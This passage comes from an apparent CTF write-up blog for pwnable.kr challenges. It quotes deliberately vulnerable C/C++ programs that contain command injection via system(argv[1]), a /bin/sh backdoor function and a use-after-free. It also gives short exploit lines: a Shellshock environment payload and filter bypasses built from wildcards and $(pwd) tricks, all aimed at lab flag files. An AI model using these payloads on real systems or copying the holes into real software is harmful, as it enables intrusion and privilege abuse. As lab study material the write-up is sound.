class=\"keyword\">socklen_t</span>*)&amp;c);</div><div class=\"line\">        <span class=\"keyword\">if</span>(cd &lt; <span class=\"number\">0</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"accept error, tell admin\\n\"</span>);</div><div class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">if</span>( recv(cd, buf, <span class=\"number\">4</span>, <span class=\"number\">0</span>) != <span class=\"number\">4</span> ) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">memcmp</span>(buf, <span class=\"string\">\"\\xde\\xad\\xbe\\xef\"</span>, <span class=\"number\">4</span>)) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Stage 5 clear!\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// here's your flag</span></div><div class=\"line\">        system(<span class=\"string\">\"/bin/cat flag\"</span>);</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<h3 id=\"Stage1\"><a href=\"#Stage1\" class=\"headerlink\" title=\"Stage1\"></a>Stage1</h3><ul>\n<li>Exactly 100 arguments</li>\n<li>The argument n0. 65 (ascii value for A) must be an empty string</li>\n<li>The argument no. 66 (ascii value for B) must be \\x20\\x0a\\x0d</li>\n</ul>\n<p><a href=\"https://werewblog.wordpress.com/2016/01/11/pwnable-kr-input/\" target=\"_blank\" rel=\"external\">TODO</a></p>\n<hr>\n<h2 id=\"leg\"><a href=\"#leg\" class=\"headerlink\" title=\"leg\"></a>leg</h2><p><a href=\"http://blog.csdn.net/qq_19550513/article/details/62044968\" target=\"_blank\" rel=\"external\">TODO</a></p>\n<h2 id=\"mistake\"><a href=\"#mistake\" class=\"headerlink\" title=\"mistake\"></a>mistake</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PW_LEN 10</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> XORKEY 1</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">xor</span><span class=\"params\">(<span class=\"keyword\">char</span>* s, <span class=\"keyword\">int</span> len)</span></span>&#123;</div><div class=\"line\">        <span class=\"keyword\">int</span> i;</div><div class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;len; i++)&#123;</div><div class=\"line\">                s[i] ^= XORKEY;</div><div class=\"line\">        &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">int</span> fd;</div><div class=\"line\">        <span class=\"keyword\">if</span>(fd=open(<span class=\"string\">\"/home/mistake/password\"</span>,O_RDONLY,<span class=\"number\">0400</span>) &lt; <span class=\"number\">0</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"can't open password %d\\n\"</span>, fd);</div><div class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"do not bruteforce...\\n\"</span>);</div><div class=\"line\">        sleep(time(<span class=\"number\">0</span>)%<span class=\"number\">20</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">char</span> pw_buf[PW_LEN+<span class=\"number\">1</span>];</div><div class=\"line\">        <span class=\"keyword\">int</span> len;</div><div class=\"line\">        <span class=\"keyword\">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class=\"number\">0</span>))&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"read error\\n\"</span>);</div><div class=\"line\">                close(fd);</div><div class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">char</span> pw_buf2[PW_LEN+<span class=\"number\">1</span>];</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"input password : \"</span>);</div><div class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%10s\"</span>, pw_buf2);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// xor your input</span></div><div class=\"line\">        xor(pw_buf2, <span class=\"number\">10</span>);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"built_in\">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"Password OK\\n\"</span>);</div><div class=\"line\">                system(<span class=\"string\">\"/bin/cat flag\\n\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">else</span>&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"Wrong Password\\n\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        close(fd);</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li><a href=\"https://baike.baidu.com/item/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/4752611?fr=aladdin#5_1\" target=\"_blank\" rel=\"external\">操作符优先度</a></li>\n</ul>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">mistake@ubuntu:~$ ./mistake</div><div class=\"line\">do not bruteforce...</div><div class=\"line\">0000000000</div><div class=\"line\">input password : 1111111111</div><div class=\"line\">Password OK</div><div class=\"line\">Mommy, the operator priority always confuses me :(</div></pre></td></tr></table></figure>\n<h2 id=\"shellshock\"><a href=\"#shellshock\" class=\"headerlink\" title=\"shellshock\"></a>shellshock</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">        setresuid(getegid(), getegid(), getegid());</div><div class=\"line\">        setresgid(getegid(), getegid(), getegid());</div><div class=\"line\">        system(<span class=\"string\">\"/home/shellshock/bash -c 'echo shock_me'\"</span>);</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li><a href=\"http://www.freebuf.com/articles/system/45390.html\" target=\"_blank\" rel=\"external\">破壳（ShellShock）漏洞</a></li>\n</ul>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\">shellshock@ubuntu:~$ env x='() &#123; :;&#125;; /bin/cat flag' ./shellshock</div><div class=\"line\">only <span class=\"keyword\">if</span> I knew CVE<span class=\"number\">-2014</span><span class=\"number\">-6271</span> ten years ago..!!</div></pre></td></tr></table></figure>\n<h2 id=\"coin1\"><a href=\"#coin1\" class=\"headerlink\" title=\"coin1\"></a>coin1</h2><p><a href=\"http://blog.csdn.net/qq_19550513/article/details/62888874\" target=\"_blank\" rel=\"external\">TODO</a></p>\n<h2 id=\"blackjack\"><a href=\"#blackjack\" class=\"headerlink\" title=\"blackjack\"></a>blackjack</h2><p><a href=\"https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html\" target=\"_blank\" rel=\"external\">code</a></p>\n<div class=\"note info\"><p>Points</p></div>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">betting</span><span class=\"params\">()</span> <span class=\"comment\">//Asks user amount to bet</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\\nEnter Bet: $\"</span>);</div><div class=\"line\"> <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;bet);</div><div class=\"line\"> </div><div class=\"line\"> <span class=\"keyword\">if</span> (bet &gt; cash) <span class=\"comment\">//If player tries to bet more money than player has</span></div><div class=\"line\"> &#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\nYou cannot bet more money than you have.\"</span>);</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\nEnter Bet: \"</span>);</div><div class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;bet);</div><div class=\"line\">        <span class=\"keyword\">return</span> bet;</div><div class=\"line\"> &#125;</div><div class=\"line\"> <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> bet;</div><div class=\"line\">&#125; <span class=\"comment\">// End Function</span></div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp</p></div>\n<p>任意输入超大金额或者负值，重新开始游戏后得到flag</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">-------</div><div class=\"line\">YaY_I_AM_A_MILLIONARE_LOL</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">Cash: $1539608052</div><div class=\"line\">-------</div><div class=\"line\">|D    |</div><div class=\"line\">|  7  |</div><div class=\"line\">|    D|</div><div class=\"line\">-------</div><div class=\"line\"></div><div class=\"line\">Your Total is 7</div><div class=\"line\"></div><div class=\"line\">The Dealer Has a Total of 1</div><div class=\"line\"></div><div class=\"line\">Enter Bet: $</div></pre></td></tr></table></figure>\n<h2 id=\"lotto\"><a href=\"#lotto\" class=\"headerlink\" title=\"lotto\"></a>lotto</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> submit[<span class=\"number\">6</span>];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">play</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">int</span> i;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Submit your 6 lotto bytes : \"</span>);</div><div class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">int</span> r;</div><div class=\"line\">        r = read(<span class=\"number\">0</span>, submit, <span class=\"number\">6</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Lotto Start!\\n\"</span>);</div><div class=\"line\">        <span class=\"comment\">//sleep(1);</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// generate lotto numbers</span></div><div class=\"line\">        <span class=\"keyword\">int</span> fd = open(<span class=\"string\">\"/dev/urandom\"</span>, O_RDONLY);</div><div class=\"line\">        <span class=\"keyword\">if</span>(fd==<span class=\"number\">-1</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"error. tell admin\\n\"</span>);</div><div class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> lotto[<span class=\"number\">6</span>];</div><div class=\"line\">        <span class=\"keyword\">if</span>(read(fd, lotto, <span class=\"number\">6</span>) != <span class=\"number\">6</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"error2. tell admin\\n\"</span>);</div><div class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">6</span>; i++)&#123;</div><div class=\"line\">                lotto[i] = (lotto[i] % <span class=\"number\">45</span>) + <span class=\"number\">1</span>;         <span class=\"comment\">// 1 ~ 45</span></div><div class=\"line\">        &#125;</div><div class=\"line\">        close(fd);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// calculate lotto score</span></div><div class=\"line\">        <span class=\"keyword\">int</span> match = <span class=\"number\">0</span>, j = <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">6</span>; i++)&#123;</div><div class=\"line\">                <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">6</span>; j++)&#123;</div><div class=\"line\">                        <span class=\"keyword\">if</span>(lotto[i] == submit[j])&#123;</div><div class=\"line\">                                match++;</div><div class=\"line\">                        &#125;</div><div class=\"line\">                &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// win!</span></div><div class=\"line\">        <span class=\"keyword\">if</span>(match == <span class=\"number\">6</span>)&#123;</div><div class=\"line\">                system(<span class=\"string\">\"/bin/cat flag\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">else</span>&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"bad luck...\\n\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">&#125;</div><div class=\"line\">...</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// menu</span></div><div class=\"line\">        <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> menu;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"- Select Menu -\\n\"</span>);</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"1. Play Lotto\\n\"</span>);</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"2. Help\\n\"</span>);</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"3. Exit\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">                <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;menu);</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">switch</span>(menu)&#123;</div><div class=\"line\">                        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</div><div class=\"line\">                                play();</div><div class=\"line\">                                <span class=\"keyword\">break</span>;</div><div class=\"line\">                        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</div><div class=\"line\">                                help();</div><div class=\"line\">                                <span class=\"keyword\">break</span>;</div><div class=\"line\">                        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</div><div class=\"line\">                                <span class=\"built_in\">printf</span>(<span class=\"string\">\"bye\\n\"</span>);</div><div class=\"line\">                                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">                        <span class=\"keyword\">default</span>:</div><div class=\"line\">                                <span class=\"built_in\">printf</span>(<span class=\"string\">\"invalid menu\\n\"</span>);</div><div class=\"line\">                                <span class=\"keyword\">break</span>;</div><div class=\"line\">                &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">// calculate lotto score</span></div><div class=\"line\"><span class=\"keyword\">int</span> match = <span class=\"number\">0</span>, j = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">6</span>; i++)&#123;</div><div class=\"line\">        <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">6</span>; j++)&#123;</div><div class=\"line\">                <span class=\"keyword\">if</span>(lotto[i] == submit[j])&#123;</div><div class=\"line\">                        match++;</div><div class=\"line\">                &#125;</div><div class=\"line\">        &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">Submit your 6 lotto bytes : !!!!!!</div><div class=\"line\">Lotto Start!</div><div class=\"line\">sorry mom... I FORGOT to check duplicate numbers... :(</div><div class=\"line\">- Select Menu -</div><div class=\"line\">1. Play Lotto</div><div class=\"line\">2. Help</div><div class=\"line\">3. Exit</div></pre></td></tr></table></figure>\n<h2 id=\"cmd1\"><a href=\"#cmd1\" class=\"headerlink\" title=\"cmd1\"></a>cmd1</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">filter</span><span class=\"params\">(<span class=\"keyword\">char</span>* cmd)</span></span>&#123;</div><div class=\"line\">        <span class=\"keyword\">int</span> r=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"flag\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"sh\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"tmp\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">return</span> r;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[], <span class=\"keyword\">char</span>** envp)</span></span>&#123;</div><div class=\"line\">        putenv(<span class=\"string\">\"PATH=/fuckyouverymuch\"</span>);</div><div class=\"line\">        <span class=\"keyword\">if</span>(filter(argv[<span class=\"number\">1</span>])) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        system( argv[<span class=\"number\">1</span>] );</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li>通配符</li>\n</ul>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">cmd1@ubuntu:~$ ./cmd1 \"/bin/cat fl*\"</div><div class=\"line\">mommy now I get what PATH environment is for :)</div></pre></td></tr></table></figure>\n<h2 id=\"cmd2\"><a href=\"#cmd2\" class=\"headerlink\" title=\"cmd2\"></a>cmd2</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">filter</span><span class=\"params\">(<span class=\"keyword\">char</span>* cmd)</span></span>&#123;</div><div class=\"line\">        <span class=\"keyword\">int</span> r=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"=\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"PATH\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"export\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"/\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"`\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        r += <span class=\"built_in\">strstr</span>(cmd, <span class=\"string\">\"flag\"</span>)!=<span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">return</span> r;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span>** environ;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">delete_env</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">        <span class=\"keyword\">char</span>** p;</div><div class=\"line\">        <span class=\"keyword\">for</span>(p=environ; *p; p++) <span class=\"built_in\">memset</span>(*p, <span class=\"number\">0</span>, <span class=\"built_in\">strlen</span>(*p));</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[], <span class=\"keyword\">char</span>** envp)</span></span>&#123;</div><div class=\"line\">        delete_env();</div><div class=\"line\">        putenv(<span class=\"string\">\"PATH=/no_command_execution_until_you_become_a_hacker\"</span>);</div><div class=\"line\">        <span class=\"keyword\">if</span>(filter(argv[<span class=\"number\">1</span>])) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>, argv[<span class=\"number\">1</span>]);</div><div class=\"line\">        system( argv[<span class=\"number\">1</span>] );</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">cmd2@ubuntu:/$ ./home/cmd2/cmd2  $($(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*)</div><div class=\"line\">/bin/cat: /home/cmd2/flag: Permission denied</div><div class=\"line\">Segmentation fault</div><div class=\"line\">cmd2@ubuntu:/$ ./home/cmd2/cmd2  '$($(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*)'</div><div class=\"line\"><span class=\"meta\">$</span>($(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*)</div><div class=\"line\">sh: 1: FuN_w1th_5h3ll_v4riabl3s_haha: not found</div></pre></td></tr></table></figure>\n<p><a href=\"http://www.jianshu.com/p/c70e50710804\" target=\"_blank\" rel=\"external\">or</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">$</span> ln -s /bin/cat cat</div><div class=\"line\"><span class=\"meta\">$</span> mkdir c</div><div class=\"line\"><span class=\"meta\">$</span> cd c</div><div class=\"line\"><span class=\"meta\">$</span> ln -s /home/cmd2/flag flag</div><div class=\"line\"><span class=\"meta\">$</span> /home/cmd2/cmd2 \"\\$(pwd)at f*\"</div><div class=\"line\"><span class=\"meta\">$</span>(pwd)at f*</div><div class=\"line\">FuN_w1th_5h3ll_v4riabl3s_haha</div></pre></td></tr></table></figure>\n<h2 id=\"uaf\"><a href=\"#uaf\" class=\"headerlink\" title=\"uaf\"></a>uaf</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdlib&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Human</span>&#123;</span></div><div class=\"line\"><span class=\"keyword\">private</span>:</div><div class=\"line\">        <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"keyword\">void</span> <span class=\"title\">give_shell</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">                system(<span class=\"string\">\"/bin/sh\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\"><span class=\"keyword\">protected</span>:</div><div class=\"line\">        <span class=\"keyword\">int</span> age;</div><div class=\"line\">        <span class=\"built_in\">string</span> name;</div><div class=\"line\"><span class=\"keyword\">public</span>:</div><div class=\"line\">        <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"keyword\">void</span> <span class=\"title\">introduce</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"My name is \"</span> &lt;&lt; name &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"I am \"</span> &lt;&lt; age &lt;&lt; <span class=\"string\">\" years old\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Man</span>:</span> <span class=\"keyword\">public</span> Human&#123;</div><div class=\"line\"><span class=\"keyword\">public</span>:</div><div class=\"line\">        Man(<span class=\"built_in\">string</span> name, <span class=\"keyword\">int</span> age)&#123;</div><div class=\"line\">                <span class=\"keyword\">this</span>-&gt;name = name;</div><div class=\"line\">                <span class=\"keyword\">this</span>-&gt;age = age;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"keyword\">void</span> <span class=\"title\">introduce</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">                Human::introduce();</div><div class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"I am a nice guy!\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Woman</span>:</span> <span class=\"keyword\">public</span> Human&#123;</div><div class=\"line\"><span class=\"keyword\">public</span>:</div><div class=\"line\">        Woman(<span class=\"built_in\">string</span> name, <span class=\"keyword\">int</span> age)&#123;</div><div class=\"line\">                <span class=\"keyword\">this</span>-&gt;name = name;</div><div class=\"line\">                <span class=\"keyword\">this</span>-&gt;age = age;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"keyword\">void</span> <span class=\"title\">introduce</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">                Human::introduce();</div><div class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"I am a cute girl!\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</div><div class=\"line\">        Human* m = <span class=\"keyword\">new</span> Man(<span 